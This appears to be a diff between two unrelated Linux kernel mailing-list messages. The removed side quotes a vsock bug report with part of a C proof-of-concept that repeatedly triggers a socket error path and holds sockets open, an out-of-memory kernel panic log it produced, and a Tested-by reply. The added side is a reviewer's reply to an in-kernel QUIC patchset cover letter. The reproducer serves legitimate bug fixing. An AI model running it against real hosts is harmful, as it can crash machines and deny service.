-> >       listener_fd =3D prepare_listener(server_port, fail_port, buffer_s=
-ize);
-> >
-> >       client_ctx_init(&ctx, server_port, client_port, send_bytes);
-> >       if (pthread_create(&tid, NULL, client_thread, &ctx) !=3D 0)
-> >               die("pthread_create");
-> >
-> >       if (wait_for_connect(&ctx) !=3D 0) {
-> >               fprintf(stderr, "client connect failed with errno=3D%d (%=
-s)\n",
-> >                       ctx.connect_errno, strerror(ctx.connect_errno));
-> >               exit(EXIT_FAILURE);
-> >       }
-> >
-> >       wait_for_send_progress(&ctx);
-> >
-> >       accept_fd =3D accept(listener_fd, NULL, NULL);
-> >       accept_errno =3D errno;
-> >
-> >       fprintf(stderr, "[*] accept() returned fd=3D%d errno=3D%d (%s)\n"=
-,
-> >               accept_fd, accept_errno, strerror(accept_errno));
-> >
-> >       if (accept_fd >=3D 0) {
-> >               fprintf(stderr, "unexpected successful accept()\n");
-> >               exit(EXIT_FAILURE);
-> >       }
-> >
-> >       if (accept_errno !=3D ECONNRESET) {
-> >               fprintf(stderr, "unexpected accept errno: %d (%s)\n",
-> >                       accept_errno, strerror(accept_errno));
-> >               exit(EXIT_FAILURE);
-> >       }
-> >
-> >       close(listener_fd);
-> >
-> >       pthread_join(tid, NULL);
-> >
-> >       fprintf(stderr,
-> >               "[*] client connect errno=3D%d send errno=3D%d bytes_sent=
-=3D%llu sent_any=3D%d done=3D%d\n",
-> >               ctx.connect_errno, ctx.send_errno, ctx.bytes_sent,
-> >               ctx.sent_any, ctx.done);
-> >       accept_fd =3D ctx.fd;
-> >       ctx.fd =3D -1;
-> >       client_ctx_destroy(&ctx);
-> >       return accept_fd;
-> >}
-> >
-> >static unsigned int parse_u32(const char *s)
-> >{
-> >       unsigned long long v =3D strtoull(s, NULL, 0);
-> >
-> >       if (v > UINT32_MAX) {
-> >               fprintf(stderr, "value too large: %s\n", s);
-> >               exit(EXIT_FAILURE);
-> >       }
-> >
-> >       return (unsigned int)v;
-> >}
-> >
-> >static unsigned long long parse_u64(const char *s)
-> >{
-> >       return strtoull(s, NULL, 0);
-> >}
-> >
-> >int main(int argc, char **argv)
-> >{
-> >       unsigned int iterations =3D DEFAULT_ITERATIONS;
-> >       unsigned int base_port =3D DEFAULT_BASE_PORT;
-> >       unsigned int fail_base =3D DEFAULT_FAIL_PORT;
-> >       unsigned long long buffer_size =3D DEFAULT_BUFFER_SIZE;
-> >       unsigned long long send_bytes =3D DEFAULT_SEND_BYTES;
-> >       unsigned int hold_seconds =3D 0;
-> >       int *held_fds;
-> >       unsigned int i;
-> >
-> >       signal(SIGPIPE, SIG_IGN);
-> >
-> >       if (argc > 1)
-> >               iterations =3D parse_u32(argv[1]);
-> >       if (argc > 2)
-> >               base_port =3D parse_u32(argv[2]);
-> >       if (argc > 3)
-> >               fail_base =3D parse_u32(argv[3]);
-> >       if (argc > 4)
-> >               buffer_size =3D parse_u64(argv[4]);
-> >       if (argc > 5)
-> >               send_bytes =3D parse_u64(argv[5]);
-> >       if (argc > 6)
-> >               hold_seconds =3D parse_u32(argv[6]);
-> >
-> >       held_fds =3D calloc(iterations, sizeof(*held_fds));
-> >       if (!held_fds)
-> >               die("calloc");
-> >
-> >       for (i =3D 0; i < iterations; i++)
-> >               held_fds[i] =3D -1;
-> >
-> >       fprintf(stderr,
-> >               "[*] iterations=3D%u base_port=3D%u fail_base=3D%u buffer=
-_size=3D%llu send_bytes=3D%llu hold_seconds=3D%u\n",
-> >               iterations, base_port, fail_base, buffer_size, send_bytes=
-,
-> >               hold_seconds);
-> >
-> >       for (i =3D 0; i < iterations; i++) {
-> >               unsigned int server_port =3D base_port + (i * 2);
-> >               unsigned int client_port =3D base_port + (i * 2) + 1;
-> >               unsigned int fail_port =3D fail_base + i;
-> >
-> >               fprintf(stderr,
-> >                       "[*] iteration=3D%u server_port=3D%u client_port=
-=3D%u fail_port=3D%u\n",
-> >                       i, server_port, client_port, fail_port);
-> >               held_fds[i] =3D trigger_once(server_port, fail_port, clie=
-nt_port,
-> >                                          buffer_size, send_bytes);
-> >               fprintf(stderr, "[*] holding client fd=3D%d\n", held_fds[=
-i]);
-> >       }
-> >
-> >       if (hold_seconds) {
-> >               fprintf(stderr, "[*] sleeping for %u seconds with client =
-sockets open\n",
-> >                       hold_seconds);
-> >               sleep(hold_seconds);
-> >       }
-> >
-> >       for (i =3D 0; i < iterations; i++) {
-> >               if (held_fds[i] >=3D 0)
-> >                       close(held_fds[i]);
-> >       }
-> >
-> >       free(held_fds);
-> >
-> >       return 0;
-> >}
-> >
-> >------END poc.c--------
-> >
-> >----BEGIN crash log----
-> >
-> >[  921.941962][T10458] Kernel panic - not syncing: Out of memory: compul=
-sory panic_on_oom is enabled
-> >[  921.942839][T10458] CPU: 0 UID: 0 PID: 10458 Comm: poc Not tainted 6.=
-12.74 #3
-> >[  921.943455][T10458] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PII=
-X, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-> >[  921.944405][T10458] Call Trace:
-> >[  921.944701][T10458]  <TASK>
-> >[  921.944974][T10458]  dump_stack_lvl+0x3b/0x1f0
-> >[  921.945423][T10458]  panic+0x6fe/0x7e0
-> >[  921.945802][T10458]  ? dump_header+0x6c2/0x950
-> >[  921.946233][T10458]  ? __pfx_panic+0x10/0x10
-> >[  921.947686][T10458]  ? out_of_memory+0x8c5/0x16b0
-> >[  921.948137][T10458]  out_of_memory+0x8f3/0x16b0
-> >[  921.949926][T10458]  __alloc_pages_noprof+0x1ec3/0x26d0
-> >[  921.954378][T10458]  alloc_pages_mpol_noprof+0x2ce/0x610
-> >[  921.956796][T10458]  folio_alloc_noprof+0x23/0xd0
-> >[  921.957720][T10458]  filemap_alloc_folio_noprof+0x35d/0x420
-> >[  921.959719][T10458]  filemap_fault+0x675/0x2800
-> >[  921.962920][T10458]  do_pte_missing+0x174c/0x3ff0
-> >[  921.964830][T10458]  __handle_mm_fault+0xfa3/0x2a10
-> >[  921.967730][T10458]  handle_mm_fault+0x3f5/0xa00
-> >[  921.968200][T10458]  do_user_addr_fault+0x50a/0x1490
-> >[  921.968691][T10458]  exc_page_fault+0x5d/0xe0
-> >[  921.969113][T10458]  asm_exc_page_fault+0x26/0x30
-> >[  921.969561][T10458] RIP: 0033:0x7f47a09b2237
-> >[  921.969990][T10458] Code: Unable to access opcode bytes at 0x7f47a09b=
-220d.
-> >[  921.970550][T10458] RSP: 002b:00007f47a089be60 EFLAGS: 00010202
-> >[  921.971073][T10458] RAX: 0000000000010000 RBX: 00007ffe78934c80 RCX: =
-00007f47a0942c8e
-> >[  921.972372][T10458] RDX: 000000000000002c RSI: 0000000000000000 RDI: =
-0000000000000016
-> >[  921.973017][T10458] RBP: 0000000001800000 R08: 0000000000000000 R09: =
-0000000000000000
-> >[  921.974428][T10458]  </TASK>
-> >[  921.974959][T10458] Kernel Offset: disabled
-> >[  921.975445][T10458] Rebooting in 86400 seconds..
-> >
-> >-----END crash log-----
-> >
-> >Best regards,
-> >Zihan Xi
-> >
-> >Zihan Xi (1):
-> >  vsock: clear stale sk_err before listen()
-> >
-> > net/vmw_vsock/af_vsock.c | 4 ++++
-> > 1 file changed, 4 insertions(+)
-> >
-> >--
-> >2.43.0
-> >
->
+On 7/15/26 10:27 PM, Xin Long wrote:
+> Introduction
+> ============
+> 
+> The QUIC protocol, defined in RFC 9000, is a secure, multiplexed transport
+> built on top of UDP. It enables low-latency connection establishment,
+> stream-based communication with flow control, and supports connection
+> migration across network paths, while ensuring confidentiality, integrity,
+> and availability.
+> 
+> This implementation introduces QUIC support in Linux Kernel, offering
+> several key advantages:
+> 
+> - In-Kernel QUIC Support for Subsystems: Enables kernel subsystems
+>   such as SMB and NFS to operate over QUIC with minimal changes. Once the
+>   handshake is complete via the net/handshake APIs, data exchange proceeds
+>   over standard in-kernel transport interfaces.
+> 
+> - Standard Socket API Semantics: Implements core socket operations
+>   (listen(), accept(), connect(), sendmsg(), recvmsg(), close(),
+>   getsockopt(), setsockopt(), getsockname(), and getpeername()),
+>   allowing user space to interact with QUIC sockets in a familiar,
+>   POSIX-compliant way.
+> 
+> - ALPN-Based Connection Dispatching: Supports in-kernel ALPN
+>   (Application-Layer Protocol Negotiation) routing, allowing demultiplexing
+>   of QUIC connections across different user-space processes based
+>   on the ALPN identifiers.
+> 
+> - Performance Enhancements: Handles all control messages in-kernel
+>   to reduce syscall overhead, incorporates zero-copy mechanisms such as
+>   sendfile() to minimize data movement, and is also structured to support
+>   future crypto hardware offloads.
+> 
+> This implementation offers fundamental support for the following RFCs:
+> 
+> - RFC9000 - QUIC: A UDP-Based Multiplexed and Secure Transport
+> - RFC9001 - Using TLS to Secure QUIC
+> - RFC9002 - QUIC Loss Detection and Congestion Control
+> - RFC9221 - An Unreliable Datagram Extension to QUIC
+> - RFC9287 - Greasing the QUIC Bit
+> - RFC9368 - Compatible Version Negotiation for QUIC
+> - RFC9369 - QUIC Version 2
+> 
+> The socket APIs for QUIC follow the RFC draft [1]:
+> 
+> - The Sockets API Extensions for In-kernel QUIC Implementations
+> 
+> Implementation
+> ==============
+> 
+> The central design is to implement QUIC within the kernel while delegating
+> the handshake to userspace.
+> 
+> Only the processing and creation of raw TLS Handshake Messages are handled
+> in userspace, facilitated by a TLS library like GnuTLS. These messages are
+> exchanged between kernel and userspace via sendmsg() and recvmsg(), with
+> cryptographic details conveyed through control messages (cmsg).
+> 
+> The entire QUIC protocol, aside from the TLS Handshake Messages processing
+> and creation, is managed in the kernel. Rather than using an Upper Layer
+> Protocol (ULP) layer, this implementation establishes a socket of type
+> IPPROTO_QUIC (similar to IPPROTO_MPTCP), operating over UDP tunnels.
+> 
+> For kernel consumers, they can initiate a handshake request from the kernel
+> to userspace using the existing net/handshake netlink. The userspace
+> component, such as tlshd service [2], then manages the processing
+> of the QUIC handshake request.
+> 
+> - Handshake Architecture:
+> 
+>   ┌──────┐  ┌──────┐
+>   │ APP1 │  │ APP2 │ ...
+>   └──────┘  └──────┘
+>   ┌──────────────────────────────────────────┐
+>   │     {quic_client/server_handshake()}     │<─────────────┐
+>   └──────────────────────────────────────────┘       ┌─────────────┐
+>    {send/recvmsg()}      {set/getsockopt()}          │    tlshd    │
+>    [CMSG handshake_info] [SOCKOPT_CRYPTO_SECRET]     └─────────────┘
+>                          [SOCKOPT_TRANSPORT_PARAM_EXT]    │   ^
+>                 │ ^                  │ ^                  │   │
+>   Userspace     │ │                  │ │                  │   │
+>   ──────────────│─│──────────────────│─│──────────────────│───│───────
+>   Kernel        │ │                  │ │                  │   │
+>                 v │                  v │                  v   │
+>   ┌──────────────────┬───────────────────────┐       ┌─────────────┐
+>   │ protocol, timer, │ socket (IPPROTO_QUIC) │<──┐   │ handshake   │
+>   │                  ├───────────────────────┤   │   │netlink APIs │
+>   │ common, family,  │ outqueue  |  inqueue  │   │   └─────────────┘
+>   │                  ├───────────────────────┤   │      │       │
+>   │ stream, connid,  │         frame         │   │   ┌─────┐ ┌─────┐
+>   │                  ├───────────────────────┤   │   │     │ │     │
+>   │ path, pnspace,   │         packet        │   │───│ SMB │ │ NFS │...
+>   │                  ├───────────────────────┤   │   │     │ │     │
+>   │ cong, crypto     │       UDP tunnels     │   │   └─────┘ └─────┘
+>   └──────────────────┴───────────────────────┘   └──────┴───────┘
+> 
+> - User Data Architecture:
+> 
+>   ┌──────┐  ┌──────┐
+>   │ APP1 │  │ APP2 │ ...
+>   └──────┘  └──────┘
+>    {send/recvmsg()}   {set/getsockopt()}              {recvmsg()}
+>    [CMSG stream_info] [SOCKOPT_KEY_UPDATE]            [EVENT conn update]
+>                       [SOCKOPT_CONNECTION_MIGRATION]  [EVENT stream update]
+>                       [SOCKOPT_STREAM_OPEN/RESET/STOP]
+>                 │ ^               │ ^                     ^
+>   Userspace     │ │               │ │                     │
+>   ──────────────│─│───────────────│─│─────────────────────│───────────
+>   Kernel        │ │               │ │                     │
+>                 v │               v │  ┌──────────────────┘
+>   ┌──────────────────┬───────────────────────┐
+>   │ protocol, timer, │ socket (IPPROTO_QUIC) │<──┐{kernel_send/recvmsg()}
+>   │                  ├───────────────────────┤   │{kernel_set/getsockopt()}
+>   │ common, family,  │ outqueue  |  inqueue  │   │{kernel_recvmsg()}
+>   │                  ├───────────────────────┤   │
+>   │ stream, connid,  │         frame         │   │   ┌─────┐ ┌─────┐
+>   │                  ├───────────────────────┤   │   │     │ │     │
+>   │ path, pnspace,   │         packet        │   │───│ SMB │ │ NFS │...
+>   │                  ├───────────────────────┤   │   │     │ │     │
+>   │ cong, crypto     │       UDP tunnels     │   │   └─────┘ └─────┘
+>   └──────────────────┴───────────────────────┘   └──────┴───────┘
+> 
+> Interface
+> =========
+> 
+> This implementation supports a mapping of QUIC into sockets APIs. Similar
+> to TCP and SCTP, a typical Server and Client use the following system call
+> sequence to communicate:
+> 
+>     Client                             Server
+>   ──────────────────────────────────────────────────────────────────────
+>   sockfd = socket(IPPROTO_QUIC)      listenfd = socket(IPPROTO_QUIC)
+>   bind(sockfd)                       bind(listenfd)
+>                                      listen(listenfd)
+>   connect(sockfd)
+>   quic_client_handshake(sockfd)
+>                                      sockfd = accept(listenfd)
+>                                      quic_server_handshake(sockfd, cert)
+> 
+>   sendmsg(sockfd)                    recvmsg(sockfd)
+>   close(sockfd)                      close(sockfd)
+>                                      close(listenfd)
+> 
+> Please note that quic_client_handshake() and quic_server_handshake()
+> functions are currently sourced from libquic [3]. These functions are
+> responsible for receiving and processing the raw TLS handshake messages
+> until the completion of the handshake process.
+> 
+> For utilization by kernel consumers, it is essential to have tlshd
+> service [2] installed and running in userspace. This service receives
+> and manages kernel handshake requests for kernel sockets. In the kernel,
+> the APIs closely resemble those used in userspace:
+> 
+>     Client                             Server
+>   ────────────────────────────────────────────────────────────────────────
+>   __sock_create(IPPROTO_QUIC, &sock)  __sock_create(IPPROTO_QUIC, &sock)
+>   kernel_bind(sock)                   kernel_bind(sock)
+>                                       kernel_listen(sock)
+>   kernel_connect(sock)
+>   tls_client_hello_x509(args:{sock})
+>                                       kernel_accept(sock, &newsock)
+>                                       tls_server_hello_x509(args:{newsock})
+> 
+>   kernel_sendmsg(sock)                kernel_recvmsg(newsock)
+>   sock_release(sock)                  sock_release(newsock)
+>                                       sock_release(sock)
+> 
+> Please be aware that tls_client_hello_x509() and tls_server_hello_x509()
+> are APIs from net/handshake/. They are used to dispatch the handshake
+> request to the userspace tlshd service and subsequently block until the
+> handshake process is completed.
+> 
+> Use Cases
+> =========
+> 
+> - Samba
+> 
+>   Stefan Metzmacher has integrated Linux QUIC into Samba for both client
+>   and server roles [4].
+> 
+> - tlshd
+> 
+>   The tlshd daemon [2] facilitates Linux QUIC handshake requests from
+>   kernel sockets. This is essential for enabling protocols like SMB
+>   and NFS over QUIC.
+> 
+> - curl
+> 
+>   Linux QUIC is being integrated into curl [5] for HTTP/3. Example usage:
+> 
+>   # curl --http3-only https://nghttp2.org:4433/
+>   # curl --http3-only https://www.google.com/
+>   # curl --http3-only https://facebook.com/
+>   # curl --http3-only https://outlook.office.com/
+>   # curl --http3-only https://cloudflare-quic.com/
+> 
+> - httpd-portable
+> 
+>   Moritz Buhl has deployed an HTTP/3 server over Linux QUIC [6] that is
+>   accessible via Firefox and curl:
+> 
+>   https://d.moritzbuhl.de/pub
+> 
+> - NetPerfMeter
+> 
+>   The latest NetPerfMeter release supports Linux QUIC and can be used to
+>   run performance evaluations [10].
+> 
+> Test Coverage
+> =============
+> 
+> The Coverage (gcov) of Functional and Interop Tests:
+> 
+> https://d.moritzbuhl.de/lcov
+> 
+> - Functional Tests
+> 
+>   The libquic self-tests (make check) pass on all major architectures:
+>   x86_64, i386, s390x, aarch64, ppc64le.
+> 
+> - Interop tests
+> 
+>   Interoperability was validated using the QUIC Interop Runner [7] against
+>   all major userland QUIC stacks. Results are available at:
+> 
+>   https://d.moritzbuhl.de/
+> 
+> - Fuzzing via Syzkaller
+> 
+>   Syzkaller has been running kernel fuzzing with QUIC for weeks using
+>   tests/syzkaller/ in libquic [3].
+> 
+> - Performance Testing
+> 
+>   Performance was benchmarked using iperf [8] over a 100G NIC using
+>   various MTUs and packet sizes:
+> 
+>   - QUIC vs. kTLS:
+> 
+>     UNIT        size:1024      size:4096      size:16384     size:65536
+>     Gbits/sec   QUIC | kTLS    QUIC | kTLS    QUIC | kTLS    QUIC | kTLS
+>     ────────────────────────────────────────────────────────────────────
+>     mtu:1500    2.27 | 3.26    3.02 | 6.97    3.36 | 9.74    3.48 | 10.8
+>     ────────────────────────────────────────────────────────────────────
+>     mtu:9000    3.66 | 3.72    5.87 | 8.92    7.03 | 11.2    8.04 | 11.4
+> 
+>   - QUIC(disable_1rtt_encryption) vs. TCP:
+> 
+>     UNIT        size:1024      size:4096      size:16384     size:65536
+>     Gbits/sec   QUIC | TCP     QUIC | TCP     QUIC | TCP     QUIC | TCP
+>     ────────────────────────────────────────────────────────────────────
+>     mtu:1500    3.09 | 4.59    4.46 | 14.2    5.07 | 21.3    5.18 | 23.9
+>     ────────────────────────────────────────────────────────────────────
+>     mtu:9000    4.60 | 4.65    8.41 | 14.0    11.3 | 28.9    13.5 | 39.2
+> 
+> 
+>   The performance gap between QUIC and kTLS may be attributed to:
+> 
+>   - The absence of Generic Segmentation Offload (GSO) for QUIC.
+>   - An additional data copy on the transmission (TX) path.
+>   - Extra encryption required for header protection in QUIC.
+>   - A longer header length for the stream data in QUIC.
+> 
+> Patches
+> =======
+> 
+> Note: This implementation is organized into five parts and submitted across
+> two patchsets for review. This patchset includes Parts 1–2, while Parts 3–5
+> will be submitted in a subsequent patchset. For complete series, see [9].
+> 
+> 1. Infrastructure (2):
+> 
+>   net: define IPPROTO_QUIC and SOL_QUIC constants
+>   net: build socket infrastructure for QUIC protocol
+> 
+> 2. Subcomponents (13):
+> 
+>   quic: provide common utilities and data structures
+>   quic: provide family ops for address and protocol
+>   quic: provide quic.h header files for kernel and userspace
+>   quic: add stream management
+>   quic: add connection id management
+>   quic: add path management
+>   quic: add congestion control
+>   quic: add packet number space
+>   quic: add crypto key derivation and installation
+>   quic: add crypto packet encryption and decryption
+>   quic: add timer management
+>   quic: add packet builder base
+>   quic: add packet parser base
+> 
+> 3. Data Processing (8):
+> 
+>   quic: add frame encoder and decoder base
+>   quic: implement outqueue transmission and flow control
+>   quic: implement outqueue sack and retransmission
+>   quic: implement inqueue receiving and flow control
+>   quic: implement frame creation functions
+>   quic: implement frame processing functions
+>   quic: implement packet creation functions
+>   quic: implement packet processing functions
+> 
+> 4. Socket APIs (6):
+> 
+>   quic: support bind/listen/connect/accept/close()
+>   quic: support sendmsg() and recvmsg()
+>   quic: support socket options related to interaction after handshake
+>   quic: support socket options related to settings prior to handshake
+>   quic: support socket options related to setup during handshake
+>   quic: support socket ioctls and socket dump via procfs
+> 
+> 5. Documentation and Selftests (3):
+> 
+>   Documentation: describe QUIC protocol interface in quic.rst
+>   quic: create sample test using handshake APIs for kernel consumers
+>   selftests: net: add tests for QUIC protocol
+> 
+> Notice: The QUIC module is currently labeled as "EXPERIMENTAL".
+> 
+> All contributors are recognized in the respective patches with the tag of
+> 'Signed-off-by:'. Special thanks to Moritz Buhl and Stefan Metzmacher whose
+> practical use cases and insightful feedback have been instrumental in
+> shaping the design and advancing the development.
+> 
+> References
+> ==========
+> 
+> [1]  https://datatracker.ietf.org/doc/html/draft-lxin-quic-socket-apis
+> [2]  https://github.com/oracle/ktls-utils
+> [3]  https://github.com/lxin/quic
+> [4]  https://gitlab.com/samba-team/samba/-/merge_requests/4019
+> [5]  https://github.com/moritzbuhl/curl/tree/linux_curl
+> [6]  https://github.com/moritzbuhl/httpd-portable
+> [7]  https://github.com/quic-interop/quic-interop-runner
+> [8]  https://github.com/lxin/iperf
+> [9]  https://github.com/lxin/net-next/commits/quic/
+> [10] https://www.nntb.no/~dreibh/netperfmeter/
+> 
+> Changes in v2-v14: See individual patch changelogs for details.
+I see that the possible UaF reported by claude are supposedly avoided by
+a follow-up patch, as per discussion on v13. I would have been better to
+at least explicitly note such fact in the commit message. Is the
+relevant code path reachable with the current series?
 
-Hi Stefano, Phi,
+Generally speaking it would be helpful a more fine grained discussion of
+the actually reported issues. i.e. it's not obvious to me why the
+potentianl UaF reported by sashiko gemini in patch 8 for netns do not
+apply, nor could I find trivially a relevant discussion in the past few
+revision.
 
-I tested both patches below with my reproducer:
+Thanks,
 
-  [PATCH] vsock: use sock_error() to consume sk_err after connect timeout
-  Message-ID: <20260719220103.684489-1-phind.uet@gmail.com>
+Paolo
 
-  [PATCH v2] vsock: use sock_error() to consume sk_err after ...
-  Message-ID: <20260727071305.45826-1-phind.uet@gmail.com>
-
-Both fix the issue for me.
-
-Tested-by: Zihan Xi <zihanx@nebusec.ai>
-
-Best regards,
-Zihan Xi
